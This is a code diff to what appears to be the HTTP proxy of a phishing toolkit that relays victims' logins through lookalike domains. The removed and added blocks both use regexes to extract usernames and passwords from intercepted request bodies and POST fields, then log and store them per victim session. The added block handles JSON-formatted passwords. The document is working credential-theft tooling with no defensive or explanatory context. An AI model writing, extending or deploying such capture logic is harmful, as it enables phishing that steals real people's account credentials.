@@ -657,29 +657,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
 									}
-								}
-							}
-
-							if pl.goUsername.tp == "json" {
-								um2 := pl.goUsername.search.FindStringSubmatch(string(body))
-								if um2 != nil && len(um2) > 1 {
-									p.setSessionUsername(ps.SessionId, um2[1])
-									log.Success("[%d] Username: [%s]", ps.Index, um2[1])
-									if err := p.db.SetSessionUsername(ps.SessionId, um2[1]); err != nil {
-										log.Error("database: %v", err)
-									}
-								}
-							}
-
-							if pl.goPassword.tp == "json" {
-								pm2 := pl.goPassword.search.FindStringSubmatch(string(body))
-								if pm2 != nil && len(pm2) > 1 {
-									p.setSessionPassword(ps.SessionId, pm2[1])
-									log.Success("[%d] Password: [%s]", ps.Index, pm2[1])
-									if err := p.db.SetSessionPassword(ps.SessionId, pm2[1]); err != nil {
-										log.Error("database: %v", err)
-									}
-								}
+								}								
 							}
 
 							for _, cp := range pl.custom {
@@ -703,7 +681,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								for k, v := range req.PostForm {
 									// patch phishing URLs in POST params with original domains
-
 									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
@@ -714,6 +691,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											}
 										}
 									}
+
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
 										pm := pl.password.search.FindStringSubmatch(v[0])
 										if pm != nil && len(pm) > 1 {
@@ -724,6 +702,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											}
 										}
 									}
+
+									if pl.password.tp == "json" {
+										if pl.password.key != nil && pl.password.search2 != nil && pl.password.key.MatchString(k) {
+											pm := pl.password.search2.FindStringSubmatch(v[0])
+											if pm != nil && len(pm) > 1 {
+												p.setSessionPassword(ps.SessionId, pm[1])
+												log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+												if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+													log.Error("database: %v", err)
+												}
+											}
+										}
+									}
+																		
 									for _, cp := range pl.custom {
 										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
 											cm := cp.search.FindStringSubmatch(v[0])
